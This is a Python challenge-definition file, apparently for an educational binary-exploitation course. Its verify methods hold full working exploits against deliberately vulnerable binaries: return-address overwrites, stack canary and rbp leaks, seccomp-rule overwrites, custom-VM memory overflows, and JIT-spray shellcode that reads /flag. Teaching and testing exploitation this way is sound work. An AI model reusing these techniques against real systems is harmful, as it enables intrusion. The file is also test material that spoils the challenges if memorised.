import contextlib
import pwnshop
import signal
import pwn
import os

PWNSHOP_AUTOREGISTER = False

from pwnshop import retry
from ..babymem import BabyMemBase
from ..babyrev import BabyVMBase
from ..babyrev import assembler


class ToddlerOneReturnToUserShellcode(BabyMemBase):
    """
    Write a full exploit involving shellcode and a method of tricking the challenge into executing it.
    """
    PIE = True
    CANARY = False
    EXEC_STACK = False

    allocation_size = 0x1000
    shellcode_size = 0x1000
    win_function = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        if self.walkthrough:
            self.LINK_LIBRARIES = ["capstone"]

        self.shellcode_address = self.random.randrange(0x13370000, 0x31337000, 0x1000)

    def verify(self, **kwargs):
        """
        Utilize a buffer overflow to overwrite the return address, jumping to inputted shellcode at a given buffer.
        """
        with self.run_challenge(**kwargs) as process:
            process.readuntil(f"Reading 0x1000 bytes of shellcode from stdin.")
            process.send(pwn.asm(pwn.shellcraft.nop()))
            process.clean()
            process.send("\n")

            payload = pwn.cyclic(0x1000)
            process.send(payload)

            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))

        with self.run_challenge(**kwargs) as process:
            process.readuntil(f"Reading 0x1000 bytes of shellcode from stdin.")
            process.send(pwn.asm(pwn.shellcraft.readfile("/flag", 1)))
            process.clean()
            process.send("\n")

            payload = b"A" * saved_rbp_offset
            payload += b"B" * 8
            payload += pwn.p64(self.shellcode_address)
            process.send(payload)

            assert self.flag in process.readall()


class ToddlerOneReturnToUserEnvvar(BabyMemBase):
    """
    Write a full exploit involving injecting shellcode and a method of tricking the challenge into executing it.
    """
    PIE = False
    CANARY = False
    EXEC_STACK = True

    disable_aslr = True
    win_function = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def verify(self, **kwargs):
        """
        Utilize a buffer overflow to overwrite the return address, jumping to shellcode in an environment variable.
        """
        env = {
            "SHELLCODE": pwn.asm(
                pwn.shellcraft.nop() * 0x1000 + pwn.shellcraft.readfile("/flag", 1)
            ),
            "TEST": b"WTF",
            "TEST2": b"\x90"*100
        }

        with self.run_challenge(**kwargs, env=env) as process:
            payload = pwn.cyclic(0x1000)
            process.send(payload)

            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))
        shellcode_addr = core.stack.find(pwn.asm(pwn.shellcraft.nop() * 16))

        with self.run_challenge(**kwargs, env=env) as process:
            elf = pwn.ELF(process.executable)

            payload = b"A" * saved_rbp_offset
            payload += b"B" * 8
            payload += pwn.p64(shellcode_addr)
            process.send(payload)

            assert self.flag in process.readall()


class ToddlerOneRepeatBackdoorReturnToEnv(BabyMemBase):
    """
    Write a full exploit involving injecting shellcode and a method of tricking the challenge into executing it by utilizing clever payload construction.
    """
    PIE = True
    CANARY = True
    EXEC_STACK = True

    win_function = False
    repeat_backdoor = True
    echo_input = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough

    @retry(16)
    def verify(self, **kwargs):
        """
        Utilize the repeat backdoor to leak rbp/canary and overwrite the return address, jumping to shellcode in an environment variable.
        """
        env = {
            "SHELLCODE": pwn.asm(
                pwn.shellcraft.nop() * 0x4000 + pwn.shellcraft.readfile("/flag", 1)
            )
        }

        # find the canary
        for canary_distance in range(self.input_size, 0x1000):
            with self.run_challenge(**kwargs, env=env) as process:
                process.send(b"A" * canary_distance)
                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    break
        else:
            assert False

        with self.run_challenge(**kwargs, env=env) as process:
            # leak saved rbp
            payload = b"REPEAT".ljust(canary_distance - 1 + 8, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            saved_rbp = (
                process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 6]
                + b"\0\0"
            )
            assert b"\n" not in saved_rbp
            assert len(saved_rbp) == 8
            saved_rbp = pwn.u64(saved_rbp)

            # crash the program
            process.send(b"A" * canary_distance)

            assert pwnshop.did_abort(process)

        core = pwn.Coredump("core")

        shellcode_addr = (
            core.stack.find(pwn.asm(pwn.shellcraft.nop() * 0x4000)) + 0x2000
        )
        shellcode_offset = shellcode_addr - saved_rbp

        with self.run_challenge(**kwargs, env=env) as process:
            # leak saved rbp
            payload = b"REPEAT".ljust(canary_distance - 1 + 8, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            saved_rbp = (
                process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 6]
                + b"\0\0"
            )
            assert b"\n" not in saved_rbp
            assert len(saved_rbp) == 8
            saved_rbp = pwn.u64(saved_rbp)

            # leak canary
            payload = b"REPEAT".ljust(canary_distance, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            canary = (
                b"\0" + process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 7]
            )
            assert b"\n" not in canary
            assert len(canary) == 8

            # win
            payload = (
                b"A" * (canary_distance - 1)
                + canary
                + b"B" * 8
                + pwn.p64(saved_rbp + shellcode_offset)
            )

            process.send(payload)

            assert self.flag in process.readall()


class ToddlerOneBackdoorCookie(BabyMemBase):
    """
    Write a full exploit involving injecting shellcode, reverse engineering, and a method of tricking the challenge into executing your payload.
    """
    PIE = True
    CANARY = True
    EXEC_STACK = True

    win_function = False
    repeat_backdoor = True
    echo_input = True
    conditional_exit = True

    extra_canary_offset = 0

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough
        while True:
            self.backdoor_cookie = self.random.randrange(0, 2**64 - 1)
            if not (set(b"\r\n\0\t ") & set(pwn.p64(self.backdoor_cookie))):
                break

    @retry(16)
    def verify(self, **kwargs):
        """
        Utilize the repeat backdoor to leak rbp/canary and bypass the backdoor cookie (exits if failed). Then overwrite the return address and jump to shellcode in an environment variable.
        """
        env = {
            "SHELLCODE": pwn.asm(
                pwn.shellcraft.nop() * 0x4000 + pwn.shellcraft.readfile("/flag", 1)
            )
        }

        # find the exit cookie distance
        for backdoor_cookie_distance in range(self.input_size, self.input_size+16):
            with self.run_challenge(**kwargs, env=env) as process:
                process.send(b"A"*backdoor_cookie_distance + pwn.p64(self.backdoor_cookie))
                if b"avoided" in process.readall():
                    break
        else:
            assert False

        # find the canary
        for canary_distance in range(self.input_size, 0x1000):
            with self.run_challenge(**kwargs, env=env) as process:
                process.send((b"A"*backdoor_cookie_distance+pwn.p64(self.backdoor_cookie)).ljust(canary_distance))
                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    break
        else:
            assert False

        with self.run_challenge(**kwargs, env=env) as process:
            # leak saved rbp
            payload = (b"REPEAT".ljust(backdoor_cookie_distance, b"A")+pwn.p64(self.backdoor_cookie)).ljust(canary_distance - 1 + 8 + self.extra_canary_offset, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            saved_rbp = (
                process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 6]
                + b"\0\0"
            )
            assert b"\n" not in saved_rbp
            assert len(saved_rbp) == 8
            saved_rbp = pwn.u64(saved_rbp)

            # crash the program
            process.send((b"A".ljust(backdoor_cookie_distance, b"A")+pwn.p64(self.backdoor_cookie)).ljust(canary_distance - 1 + 8 + self.extra_canary_offset, b"A"))

            assert pwnshop.did_abort(process)

        core = pwn.Coredump("core")

        shellcode_addr = (
            core.stack.find(pwn.asm(pwn.shellcraft.nop() * 0x4000)) + 0x2000
        )
        shellcode_offset = shellcode_addr - saved_rbp

        with self.run_challenge(**kwargs, env=env) as process:
            # leak saved rbp
            payload = (
                b"REPEAT".ljust(backdoor_cookie_distance, b"A")+pwn.p64(self.backdoor_cookie)
            ).ljust(canary_distance - 1 + 8 + self.extra_canary_offset, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            saved_rbp = (
                process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 6]
                + b"\0\0"
            )
            assert b"\n" not in saved_rbp
            assert len(saved_rbp) == 8
            saved_rbp = pwn.u64(saved_rbp)

            # leak canary
            payload = (
                b"REPEAT".ljust(backdoor_cookie_distance, b"A")+pwn.p64(self.backdoor_cookie)
            ).ljust(canary_distance, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            canary = (
                b"\0" + process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 7]
            )
            assert b"\n" not in canary
            assert len(canary) == 8

            # win
            payload = (
                b"A" * (backdoor_cookie_distance) + pwn.p64(self.backdoor_cookie)
                + b"A" * (canary_distance - 1 - backdoor_cookie_distance - 8)
                + canary
                + b"B" * (8 + self.extra_canary_offset)
                + pwn.p64(saved_rbp + shellcode_offset)
            )

            process.send(payload)

            assert self.flag in process.readall()


class ToddlerOneOverwriteSeccompRules(ToddlerOneBackdoorCookie):
    """
    Write a full exploit involving injecting shellcode, reverse engineering, seccomp, and a method of tricking the challenge into executing your payload.
    """
    LINK_LIBRARIES = ["seccomp"]

    conditional_exit = False
    conditional_jail = True

    syscalls_allowed = ["write", "exit_group"]

    extra_canary_offset = 16  # WTF

    def verify(self, **kwargs):
        """
        Utilize the repeat backdoor to leak rbp/canary. Then overwrite the seccomp rules on the stack (written to before they're applied), and overwrite return address and jump to shellcode in an environment variable.
        """
        self.run_challenge(**kwargs)


class ToddlerOneOverwriteSeccompRulesBackdoorCookie(BabyMemBase):
    """
    Write a full exploit involving injecting shellcode, reverse engineering, seccomp, and a method of tricking the challenge into into executing your payload.
    """
    LINK_LIBRARIES = ["seccomp"]

    PIE = True
    CANARY = True
    EXEC_STACK = True

    win_function = False
    repeat_backdoor = True
    echo_input = True

    syscalls_allowed = ["write", "exit_group"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough

    @retry(16)
    def verify(self, **kwargs):
        """
        Utilize the repeat backdoor to leak rbp/canary and bypass the backdoor cookie ("jails" if failed). Then overwrite the seccomp rules on the stack (written to before they're applied), and overwrite return address and jump to shellcode in an environment variable.
        """
        nopsled = pwn.asm(pwn.shellcraft.nop())*0x4000
        env = { "SHELLCODE": nopsled + pwn.asm(pwn.shellcraft.chmod("/flag", 0o644)) }
        shellcode_needle = nopsled

        canary_rbp_offset = 24 if self.walkthrough else 8

        assert self.run_sh("stat -c %a /flag").readall().strip() != b"644"

        # find syscall offset
        for write_syscall_distance in range(self.input_size, 0x1000):
            with self.run_challenge(**kwargs, env=env) as process:
                process.send(b"A" * write_syscall_distance)
                response = process.readall()
                if b"Goodbye!" not in response:
                    break
        else:
            assert False
        syscall_offset = write_syscall_distance - 1

        # find the canary
        for canary_distance in range(syscall_offset + 8, 0x1000):
            with self.run_challenge(**kwargs, env=env) as process:
                payload = b"A" * syscall_offset
                payload += pwn.p32(pwn.constants.eval("SYS_write"))
                payload += pwn.p32(pwn.constants.eval("SYS_writev"))
                payload = payload.ljust(canary_distance, b"A")

                process.send(payload)
                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    break
        else:
            assert False

        with self.run_challenge(**kwargs, env=env) as process:
            # leak saved rbp
            payload = b"REPEAT".ljust(canary_distance - 1 + canary_rbp_offset, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            saved_rbp = (
                process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 6]
                + b"\0\0"
            )
            assert b"\n" not in saved_rbp
            assert len(saved_rbp) == 8
            saved_rbp = pwn.u64(saved_rbp)

            # crash the program
            process.send(b"A" * canary_distance)

            response = process.readall()

            assert pwnshop.did_sigsys(process)

        core = pwn.Coredump("core")

        shellcode_addr = core.stack.find(shellcode_needle) + 0x2000
        shellcode_offset = shellcode_addr - saved_rbp

        with self.run_challenge(**kwargs, env=env) as process:
            # leak saved rbp
            payload = b"REPEAT".ljust(canary_distance - 1 + canary_rbp_offset, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            saved_rbp = (
                process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 6]
                + b"\0\0"
            )
            assert b"\n" not in saved_rbp
            assert len(saved_rbp) == 8
            saved_rbp = pwn.u64(saved_rbp)

            # leak canary
            payload = b"REPEAT".ljust(canary_distance, b"A")
            process.send(payload)

            process.readuntil("You said: ")
            canary = (
                b"\0" + process.readrepeat(timeout=0.1)[len(payload) : len(payload) + 7]
            )
            assert b"\n" not in canary
            assert len(canary) == 8

            # win
            payload = b"A" * syscall_offset
            payload += pwn.p32(pwn.constants.eval("SYS_write"))
            payload += pwn.p32(pwn.constants.eval("SYS_chmod"))
            payload = payload.ljust(canary_distance - 1, b"B")
            payload += canary
            payload += b"C" * canary_rbp_offset
            payload += pwn.p64(saved_rbp + shellcode_offset)

            process.send(payload)

            process.poll(True)
            assert self.run_sh("stat -c%a /flag").readall().strip() == b"644"


class BabyVMSandboxed(BabyVMBase):
    no_open = True

    def check_no_open(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            program = assembler.finalize(["sys open d"])
            process.write(program)
            if self.walkthrough:
                assert b"Disallowed system call: SYS_OPEN" in process.readall()
            assert process.poll(True) == 1


class ToddlerOneYan85BufferOverflow(BabyVMSandboxed):
    """
    Write a full exploit for a custom VM involving injecting shellcode and a method of tricking the challenge into executing it by locating and utilizing a bug in the challenge.
    """
    PIE = False
    EXEC_STACK = True
    CANARY = False
    disable_aslr = True

    read_overflow = True
    write_overflow = True
    interpret_forever = False
    dump_stack = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough

    def verify(self, **kwargs):
        """
        Utilize read_memory in yan85 to write past yan85's memory and overwrite the return address, jumping to injected shellcode.
        """
        self.check_no_open(**kwargs)

        shellcode = pwn.asm(
            pwn.shellcraft.nop() * 128 + pwn.shellcraft.readfile("/flag", 1)
        )
        env = {"SHELLCODE": shellcode}

        program = assembler.finalize(
            ["imm a 0", "imm b 255", "imm c 255", "sys read_memory d"]
        )

        with self.run_challenge(**kwargs, env=env) as process:
            process.clean()
            process.write(program)
            process.clean()
            payload = pwn.cyclic(0x1000)
            process.send(payload)
            process.readall()
            assert pwnshop.did_segfault(process)

        core = pwn.Coredump("core")
        saved_rbp_offset = pwn.cyclic_find(pwn.p64(core.rbp))
        shellcode_addr = core.stack.find(pwn.asm(pwn.shellcraft.nop() * 16))

        with self.run_challenge(**kwargs, env=env) as process:
            process.clean()
            process.write(program)
            process.clean()

            payload = b"A" * saved_rbp_offset
            payload += b"B" * 8
            payload += pwn.p64(shellcode_addr)
            process.send(payload)

            assert self.flag in process.readall()


class ToddlerOneYan85WriteLeak(BabyVMSandboxed):
    """
     Write a full exploit for a custom VM involving injecting shellcode, and a method of tricking the challenge into executing it by locating and utilizing a bug in the challenge.
    """
    EXEC_STACK = True

    read_overflow = True
    write_overflow = True
    interpret_forever = False
    dump_stack = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough

    @retry(16, timeout=30)
    def verify(self, **kwargs):
        """
        Utilize write to leak the canary and read_memory in yan85 to write past yan85's memory and overwrite the return address, jumping to injected shellcode.
        """
        self.check_no_open(**kwargs)

        shellcode = pwn.asm(
            pwn.shellcraft.nop() * 0x2000 + pwn.shellcraft.readfile("/flag", 1)
        )
        env = {"SHELLCODE": shellcode}

        program = assembler.finalize(
            [
                "imm a 1",
                "imm b 255",
                "imm c 255",
                "sys write d",  # write
                "imm a 0",
                "imm b 255",
                "imm c 255",
                "sys read_memory d",  # read
            ]
        )

        # find the distance to the canary
        for canary_distance in range(1, 255):
            with self.run_challenge(**kwargs, env=env) as process:
                process.clean()
                process.write(program)
                process.clean()
                process.write(b"A" * canary_distance)
                response = process.readall()
                if b"*** stack smashing detected ***" in response:
                    canary_distance -= 1
                    break
        else:
            assert False

        # find a stable offset to the shellcode
        with self.run_challenge(**kwargs, env=env) as process:
            process.clean()
            process.write(program)
            #process.readline()
            if self.walkthrough:
                process.readuntil(b"write\n")
            leak = process.read()
            canary = leak[canary_distance : canary_distance + 8]
            some_other_stack_addr = leak[
                canary_distance + 9 * 16 + 8 : canary_distance + 10 * 16
            ]

            payload = b"A" * canary_distance
            payload += canary
            payload += b"B" * 8
            payload += b"C" * 8
            process.send(payload)
            process.readall()
            assert pwnshop.did_segfault(process)

        with self.run_challenge(**kwargs, env=env) as process:
            process.clean()
            process.write(program)
            #process.readline()
            if self.walkthrough:
                process.readuntil(b"write\n")
            leak = process.read()
            canary = leak[canary_distance : canary_distance + 8]
            some_other_stack_addr = leak[
                canary_distance + 9 * 16 + 8 : canary_distance + 10 * 16
            ]

            payload = b"A" * canary_distance
            payload += canary
            payload += b"B" * 8
            payload += pwn.p64(pwn.u64(some_other_stack_addr) + 0x1800)
            process.send(payload)

            o = process.readall()
            assert self.flag in o


class ToddlerOneYan85TwoStage(BabyVMSandboxed):
    """
    Provide your own Yan85 shellcode! This time, it's filtered 
    """
    EXEC_STACK = True

    read_overflow = True
    no_open = False
    no_read_code = True
    mem_first = True
    one_syscall = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough

    def verify(self, **kwargs):
        """
        Utilize two stage yan85 shellcode to bypass the only one syscall filter.
        """
        with self.run_challenge(**kwargs) as process:
            process.clean()
            process.write(assembler.finalize(["sys read_code a"]))
            if self.walkthrough:
                assert b"Disallowed system call: SYS_READ_CODE" in process.readall()
            assert process.poll(True) == 1

        program = assembler.finalize(
            ["imm a 0", "imm b 255", "imm c 255", "sys read_memory d"]  # read
        )
        program2 = b"\0" * 13 + assembler.program_getflag()

        # find a stable offset to the shellcode
        with self.run_challenge(**kwargs) as process:
            process.clean()
            process.write(program)
            process.clean()
            process.write(program2)
            o = process.readall()
            assert self.flag in o


class ToddlerOneYan85ORSyscalls(BabyVMSandboxed):
    """
    The ultimate Yan85 challenge. Provide your own Yan85 shellcode.
    """
    EXEC_STACK = True

    read_overflow = False
    no_open = False
    no_read_code = True
    mem_first = False
    one_syscall = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough

    def verify(self, **kwargs):
        """
        Utilize yan85 shellcode to bypass the only one syscall filter, requires ORing together syscalls to make multiple per instruction.
        """
        with self.run_challenge(**kwargs) as process:
            process.clean()
            process.write(assembler.finalize(["sys read_code a"]))
            if self.walkthrough:
                assert b"Disallowed system call: SYS_READ_CODE" in process.readall()
            assert process.poll(True) == 1

        sys_orw = (
            ord(assembler.ENCODING["open"])
            | ord(assembler.ENCODING["read_memory"])
            | ord(assembler.ENCODING["write"])
        )

        program = assembler.finalize(
            [
                "imm s 0",  # reset stack pointer
                "stk 0 a",
                "stk 0 a",
                "stk 0 a",  # padding
                "imm a 0x2f",
                "stk 0 a",
                "imm a 0x66",
                "stk 0 a",
                "imm a 0x6c",
                "stk 0 a",
                "imm a 0x61",
                "stk 0 a",
                "imm a 0x67",
                "stk 0 a",  # /flag
                "imm a 0",
                "stk 0 a",  # termination
                "imm a 4",
                "imm b 0",
                "imm c 255",
                f"sys {sys_orw} a",  # read
            ]
        )

        with self.run_challenge(**kwargs, stdout_fds=[len(self.flag)]) as process:
            process.clean()
            process.write(program)
            assert self.flag in process.readuntil(self.flag)

class ToddlerOneYan8564(BabyVMBase):
    """
    The ultimate Yan85 challenge. Provide your own Yan85 shellcode. Now updated for modern hardware!
    """
    LINK_LIBRARIES = ["capstone"]
    interpreted = False
    compiled = True
    jit_code_address = 0x1337000
    jit_code_size = 0x1000
    operand_type = "unsigned long long";
    word_type = "unsigned long long";
    #packed_state = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.STRIP = not self.walkthrough

    def verify(self, **kwargs):
        """
        Utilizes Yan85_64, various solutions exist.
        """
        assembler.WORD_WIDTH = 8
        assembler.WORD_FMT = "Q"
        assembler.generate_encoding()

        # check execution
        with self.run_challenge(**kwargs, alarm=1, close_stdin=True) as process:
            with contextlib.suppress(AttributeError): # some pwntools bug
                process.clean()
            process.wait()
            assert process.poll() == 0

        simple_programs = [
            # test infinite loops
            ( assembler.finalize([ "imm a 0", "jmp 0 a", ]), -signal.SIGALRM),
            ( assembler.finalize([ "imm a 1", "jmp 0 a", ]), -signal.SIGALRM),

            # test jumping over the loop
            ( assembler.finalize([ "imm a 2", "jmp 0 a", ]), 0),

            # test various jumps
            ( assembler.finalize([ "imm a 1", "imm b, 3", "add a b", "jmp 0 a", ]), 0),
            ( assembler.finalize([ "imm a 0", "imm b 2", "add i b", "jmp 0 a", ]), 0),
            ( assembler.finalize([ "imm a 0", "imm b 10", "stm a b", "ldm i a", "jmp 0 a", ]), 0),
            ( assembler.finalize([ "imm a 0", "imm b 4", "stm a b", "ldm i a", "jmp 0 a", ]), -signal.SIGALRM),
            ( assembler.finalize([ "imm a 0", "imm b 10", "stk i b", "jmp 0 a", ]), 0),

            # overflow b, loop
            ( assembler.finalize([ "imm a 0", "imm b 0xffffffffffffffff", "imm c 1", "add b c", "stk i b", "jmp 0 a", ]), -signal.SIGALRM),

            # underread the offset buffer
            ( assembler.finalize([ "imm a 0", "imm b 0xffffffffffffffff", "stk i b", "jmp 0 a", ]), -signal.SIGSEGV),
            ( assembler.finalize([ "imm a 0", "imm b -1", "stk i b", "jmp 0 a", ]), -signal.SIGSEGV),

            # redirect instruction 100 back to the beginning
            ( assembler.finalize([ "imm a 100", f"imm b {256*8+8+800}", "imm c 0", "stm b c", "jmp 0 a", ]), -signal.SIGALRM),
            ( assembler.finalize([ "imm a 100", f"imm b {256*8+8+808}", "imm c 0", "stm b c", "jmp 0 a", ]), 0),

            # jitspray into rets
            ( assembler.finalize([ "imm b 0xc3c3c3c3c3c3c3c3", "imm a 100", f"imm b {256*8+8+800}", "imm c 0x50", "stm b c", "jmp 0 a", ]), 0),
            ( assembler.finalize([ "imm b 0xc3c3c3c3c3c3c3c3", "imm a 100", f"imm b {256*8+8+800}", "imm c 0x4d", "stm b c", "jmp 0 a", ]), -signal.SIGALRM),
            ( assembler.finalize([ "imm b 0xcccccccccccccccc", "imm a 100", f"imm b {256*8+8+800}", "imm c 0x50", "stm b c", "jmp 0 a", ]), -signal.SIGTRAP),
            ( assembler.finalize([ "imm b 0xcccccccccccccccc" ] *20 + [ "imm a 100", f"imm b {256*8+8+800}", "imm c 0x50", "stm b c", "jmp 0 a", ]), -signal.SIGTRAP),
        ]
        for n, (program, ret) in enumerate(simple_programs):
            with self.run_challenge(**kwargs, alarm=1) as process:
                process.write(program)
                process.clean()
                process.wait()
                rr = process.poll()
                assert rr == ret or rr == 128 - ret

        instructions = [
            b"\x31\xdb",                #   xor    ebx,ebx
            b"\xb3\x67",                    #   mov    bl,0x67
            b"\x48\xc1\xe3\x08",            #   shl    rbx,0x8
            b"\xb3\x61",                    #   mov    bl,0x61
            b"\x48\xc1\xe3\x08",            #   shl    rbx,0x8
            b"\xb3\x6c",                    #   mov    bl,0x6c
            b"\x48\xc1\xe3\x08",            #   shl    rbx,0x8
            b"\xb3\x66",                    #   mov    bl,0x66
            b"\x48\xc1\xe3\x08",            #   shl    rbx,0x8
            b"\xb3\x2f",                    #   mov    bl,0x2f
            b"\x53",                    #   push   rbx
            b"\x31\xc0",                #   xor    eax,eax
            b"\xb0\x02",                #   mov    al,0x2
            b"\x48\x89\xe7",            #   mov    rdi,rsp
            b"\x31\xf6",                #   xor    esi,esi
            b"\x0f\x05",                #   syscall
            b"\x31\xff",                #   xor    edi,edi
            b"\x40\xb7\x01",            #   mov    dil,0x1
            b"\x31\xf6",                #   xor    esi,esi
            b"\x40\x88\xc6",            #   mov    sil,al
            b"\x31\xd2",                #   xor    edx,edx
            b"\x4d\x31\xd2",            #   xor    r10,r10
            b"\x41\xb2\x80",            #   mov    r10b,0x80
            b"\x31\xc0",                #   xor    eax,eax
            b"\xb0\x28",                #   mov    al,0x28
            b"\x0f\x05",                #   syscall
        ]

        exploit = [ "imm b 0xc3c3c3c3c3c3c358" ]*30 + [ "imm a 100", f"imm b {256*8+8+800}", "imm c 0x50", "stm b c", "jmp 0 a", ]
        for n, i in enumerate(instructions):
            v = pwn.u64(i.rjust(6, b"\x90") + b"\xeb\x09")
            exploit[n] = f"imm b {v}"
        payload = assembler.finalize(exploit)
        with self.run_challenge(**kwargs) as process:
            process.clean()
            process.write(payload)
            o = process.readall()
            assert self.flag in o

LEVELS = [
    ToddlerOneReturnToUserShellcode,
    ToddlerOneReturnToUserEnvvar,
    ToddlerOneRepeatBackdoorReturnToEnv,
    ToddlerOneBackdoorCookie,
    ToddlerOneOverwriteSeccompRules,
    ToddlerOneOverwriteSeccompRulesBackdoorCookie,
    ToddlerOneYan85BufferOverflow,
    ToddlerOneYan85WriteLeak,
    ToddlerOneYan85TwoStage,
    ToddlerOneYan85ORSyscalls,
    ToddlerOneYan8564,
]
NUM_TESTING=1
DOJO_MODULE="exploitation"
pwnshop.register_challenges(LEVELS)
